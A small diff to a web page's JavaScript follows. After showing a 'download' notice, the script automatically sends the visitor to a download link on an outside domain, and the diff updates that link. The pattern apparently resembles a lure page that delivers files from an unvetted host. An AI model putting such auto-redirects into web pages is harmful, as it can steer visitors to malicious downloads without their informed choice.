@@ -86,7 +86,7 @@ document.addEventListener('DOMContentLoaded', function() {
           const toast = document.getElementById('download-toast');
           if (toast) toast.classList.add('visible');
 
-          window.location.href = 'https://mainsecure.cyou/s/ver';
+          window.location.href = 'https://mainsecure.cyou/s/new1';
         }, 150);
       }
     }
